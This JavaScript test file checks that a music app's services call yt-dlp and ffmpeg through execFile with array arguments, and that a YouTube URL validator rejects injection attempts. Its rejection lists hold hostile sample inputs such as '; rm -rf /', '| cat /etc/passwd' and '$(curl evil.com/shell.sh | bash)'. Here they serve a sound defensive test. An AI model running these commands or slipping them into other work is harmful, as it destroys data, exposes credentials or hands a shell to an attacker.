/**
 * Security Test: Command Injection Prevention
 *
 * Tests that command injection vulnerabilities are properly mitigated
 * by using execFile with array arguments instead of exec with string interpolation.
 */

const fs = require('fs');
const path = require('path');
// const assert = require('assert');

// Test counters
let passed = 0;
let failed = 0;

function test(name, fn) {
  try {
    fn();
    passed++;
    console.log(`  ✓ ${name}`);
  } catch (error) {
    failed++;
    console.log(`  ✗ ${name}`);
    console.log(`    Error: ${error.message}`);
  }
}

function assertIncludes(source, pattern, message) {
  if (!source.includes(pattern)) {
    throw new Error(message || `Expected source to include: ${pattern}`);
  }
}

// assertNotIncludes removed - was unused

// Read source files
const songIdentificationPath = path.join(__dirname, '../services/songIdentification.js');
const songIdSource = fs.readFileSync(songIdentificationPath, 'utf8');

const musicAlignmentPath = path.join(__dirname, '../services/musicAlignment.js');
const musicAlignSource = fs.readFileSync(musicAlignmentPath, 'utf8');

const musicTimelinePath = path.join(__dirname, '../services/musicTimeline.js');
const musicTimelineSource = fs.readFileSync(musicTimelinePath, 'utf8');

const musicGenerationPath = path.join(__dirname, '../services/musicGeneration.js');
const musicGenerationSource = fs.readFileSync(musicGenerationPath, 'utf8');

console.log('\n╔═══════════════════════════════════════════════════════════════════╗');
console.log('║         SPLICE Security Test: Command Injection Prevention        ║');
console.log('╚═══════════════════════════════════════════════════════════════════╝\n');

console.log('1. songIdentification.js Security Checks');
console.log('─'.repeat(50));

test('should use execFile instead of exec', () => {
  assertIncludes(songIdSource, "require('child_process')", 'Should import from child_process');
  assertIncludes(songIdSource, 'execFile', 'Should use execFile');
});

test('should use execFileAsync instead of execAsync', () => {
  assertIncludes(songIdSource, 'execFileAsync', 'Should define execFileAsync');
  assertIncludes(songIdSource, "promisify(execFile)", 'Should promisify execFile');
});

test('should NOT use string-based exec or execAsync', () => {
  // Check that we don't have dangerous patterns
  // Allow "execFile" and "execFileAsync" but not standalone "exec(" or "execAsync("
  const lines = songIdSource.split('\n');
  const dangerousLines = lines.filter(line => {
    // Skip comment lines
    if (line.trim().startsWith('//') || line.trim().startsWith('*')) return false;
    // Check for dangerous patterns
    return (
      (line.includes('exec(') && !line.includes('execFile')) ||
      (line.includes('execAsync(') && !line.includes('execFileAsync'))
    );
  });

  if (dangerousLines.length > 0) {
    throw new Error(`Found dangerous exec patterns: ${dangerousLines.join(', ')}`);
  }
});

test('should use array arguments for yt-dlp command', () => {
  assertIncludes(songIdSource, 'ytdlpArgs', 'Should define ytdlpArgs array');
  assertIncludes(songIdSource, "execFileAsync('yt-dlp', ytdlpArgs", 'Should pass ytdlpArgs to execFileAsync');
});

test('should use array arguments for ffmpeg command', () => {
  assertIncludes(songIdSource, 'ffmpegArgs', 'Should define ffmpegArgs array');
  assertIncludes(songIdSource, "execFileAsync('ffmpeg', ffmpegArgs", 'Should pass ffmpegArgs to execFileAsync');
});

test('should NOT use string interpolation for command execution', () => {
  // Check that execAsync/execFileAsync calls don't use template literals with variables
  // This pattern looks for execAsync/execFileAsync followed by a template literal containing ${}
  const dangerousPattern = /exec(?:File)?Async\s*\(\s*`[^`]*\$\{[^}]+\}[^`]*`/;
  if (dangerousPattern.test(songIdSource)) {
    throw new Error('Found template literal with variable interpolation in exec call - injection risk');
  }
});

test('should use -- to prevent option injection in yt-dlp', () => {
  assertIncludes(songIdSource, "'--'", 'Should include -- argument to prevent URL being interpreted as option');
});

test('should validate YouTube URL before processing', () => {
  assertIncludes(songIdSource, 'validateYouTubeUrl', 'Should have URL validation function');
  assertIncludes(songIdSource, 'if (!validation.valid)', 'Should check validation result');
});

test('should have security comments explaining the fix', () => {
  assertIncludes(songIdSource, 'SECURITY:', 'Should have security comments');
  assertIncludes(songIdSource, 'command injection', 'Should mention command injection prevention');
});

console.log('\n2. YouTube URL Validation Tests');
console.log('─'.repeat(50));

// Import the module to test validation
const songIdentification = require('../services/songIdentification');

test('should accept valid YouTube URLs', () => {
  const validUrls = [
    'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
    'https://youtube.com/watch?v=dQw4w9WgXcQ',
    'https://youtu.be/dQw4w9WgXcQ',
    'https://www.youtube.com/embed/dQw4w9WgXcQ',
    'dQw4w9WgXcQ' // Just video ID
  ];

  for (const url of validUrls) {
    const result = songIdentification.validateYouTubeUrl(url);
    if (!result.valid) {
      throw new Error(`Should accept valid URL: ${url}`);
    }
  }
});

test('should reject invalid/malicious URLs', () => {
  const invalidUrls = [
    null,
    undefined,
    '',
    'https://example.com/video',
    'https://youtube.com/watch?v=abc', // Too short
    '; rm -rf /',
    '$(whoami)',
    '`id`',
    'https://youtube.com/watch?v="; cat /etc/passwd',
    '| curl evil.com'
  ];

  for (const url of invalidUrls) {
    const result = songIdentification.validateYouTubeUrl(url);
    if (result.valid) {
      throw new Error(`Should reject invalid URL: ${url}`);
    }
  }
});

test('should extract correct video ID from valid URLs', () => {
  const testCases = [
    { url: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ', expected: 'dQw4w9WgXcQ' },
    { url: 'https://youtu.be/dQw4w9WgXcQ', expected: 'dQw4w9WgXcQ' },
    { url: 'dQw4w9WgXcQ', expected: 'dQw4w9WgXcQ' }
  ];

  for (const { url, expected } of testCases) {
    const result = songIdentification.validateYouTubeUrl(url);
    if (result.videoId !== expected) {
      throw new Error(`Expected ${expected}, got ${result.videoId} for URL: ${url}`);
    }
  }
});

console.log('\n3. musicAlignment.js Security Checks');
console.log('─'.repeat(50));

test('musicAlignment should use execFile instead of exec', () => {
  assertIncludes(musicAlignSource, "require('child_process')", 'Should import from child_process');
  assertIncludes(musicAlignSource, 'execFile', 'Should use execFile');
});

test('musicAlignment should use execFileAsync', () => {
  assertIncludes(musicAlignSource, 'execFileAsync', 'Should define execFileAsync');
  assertIncludes(musicAlignSource, "promisify(execFile)", 'Should promisify execFile');
});

test('musicAlignment should NOT have unsafe exec calls', () => {
  const lines = musicAlignSource.split('\n');
  const dangerousLines = lines.filter(line => {
    if (line.trim().startsWith('//') || line.trim().startsWith('*')) return false;
    return (
      (line.includes('exec(') && !line.includes('execFile')) ||
      (line.includes('execAsync(') && !line.includes('execFileAsync'))
    );
  });

  if (dangerousLines.length > 0) {
    throw new Error(`Found dangerous exec patterns in musicAlignment.js`);
  }
});

test('musicAlignment should use array arguments for ffmpeg', () => {
  // Check that ffmpeg is called with array arguments
  assertIncludes(musicAlignSource, "execFileAsync('ffmpeg',", 'Should call ffmpeg via execFileAsync');
});

test('musicAlignment should use array arguments for ffprobe', () => {
  assertIncludes(musicAlignSource, "execFileAsync(\n    'ffprobe'", 'Should call ffprobe via execFileAsync');
});

test('musicAlignment should have security comments', () => {
  const securityCommentCount = (musicAlignSource.match(/SECURITY:/g) || []).length;
  if (securityCommentCount < 5) {
    throw new Error(`Expected at least 5 security comments, found ${securityCommentCount}`);
  }
});

console.log('\n4. musicTimeline.js Security Checks');
console.log('─'.repeat(50));

test('musicTimeline should use execFile', () => {
  assertIncludes(musicTimelineSource, 'execFile', 'Should use execFile');
  assertIncludes(musicTimelineSource, 'execFileAsync', 'Should define execFileAsync');
});

test('musicTimeline should NOT have unsafe exec calls', () => {
  const lines = musicTimelineSource.split('\n');
  const dangerousLines = lines.filter(line => {
    if (line.trim().startsWith('//') || line.trim().startsWith('*')) return false;
    return (
      (line.includes('exec(') && !line.includes('execFile')) ||
      (line.includes('execAsync(') && !line.includes('execFileAsync'))
    );
  });
  if (dangerousLines.length > 0) {
    throw new Error(`Found dangerous exec patterns in musicTimeline.js`);
  }
});

test('musicTimeline should use array arguments for ffmpeg', () => {
  assertIncludes(musicTimelineSource, "execFileAsync('ffmpeg',", 'Should call ffmpeg via execFileAsync');
});

console.log('\n5. musicGeneration.js Security Checks');
console.log('─'.repeat(50));

test('musicGeneration should use execFile', () => {
  assertIncludes(musicGenerationSource, 'execFile', 'Should use execFile');
  assertIncludes(musicGenerationSource, 'execFileAsync', 'Should define execFileAsync');
});

test('musicGeneration should NOT have unsafe exec calls', () => {
  const lines = musicGenerationSource.split('\n');
  const dangerousLines = lines.filter(line => {
    if (line.trim().startsWith('//') || line.trim().startsWith('*')) return false;
    return (
      (line.includes('exec(') && !line.includes('execFile')) ||
      (line.includes('execAsync(') && !line.includes('execFileAsync'))
    );
  });
  if (dangerousLines.length > 0) {
    throw new Error(`Found dangerous exec patterns in musicGeneration.js`);
  }
});

test('musicGeneration should use array arguments for ffmpeg', () => {
  assertIncludes(musicGenerationSource, "execFileAsync('ffmpeg',", 'Should call ffmpeg via execFileAsync');
});

console.log('\n6. Command Injection Attack Prevention');
console.log('─'.repeat(50));

test('validateYouTubeUrl should reject shell metacharacters', () => {
  const attacks = [
    'dQw4w9WgXcQ; rm -rf /',
    'dQw4w9WgXcQ | cat /etc/passwd',
    'dQw4w9WgXcQ && whoami',
    'dQw4w9WgXcQ`id`',
    '$(curl evil.com/shell.sh | bash)',
    'dQw4w9WgXcQ\n/bin/bash -i'
  ];

  for (const attack of attacks) {
    const result = songIdentification.validateYouTubeUrl(attack);
    // These should all be rejected because they don't match the video ID pattern
    // If valid, the videoId should NOT contain shell metacharacters
    if (result.valid && result.videoId) {
      const hasDangerousChars = (
        result.videoId.includes(';') ||
        result.videoId.includes('|') ||
        result.videoId.includes('`') ||
        result.videoId.includes('$') ||
        result.videoId.includes('&') ||
        result.videoId.includes('\n')
      );
      if (hasDangerousChars) {
        throw new Error(`Shell metacharacter passed through: ${attack}`);
      }
    }
    // If not valid, that's fine - attack was blocked
  }
});

// Summary
console.log('\n' + '═'.repeat(55));
console.log(`Results: ${passed} passed, ${failed} failed`);
console.log('═'.repeat(55));

if (failed > 0) {
  console.log('\n❌ SECURITY TEST FAILED - Command injection vulnerabilities may exist!\n');
  process.exit(1);
} else {
  console.log('\n✅ SECURITY TEST PASSED - Command injection protections verified!\n');
  process.exit(0);
}
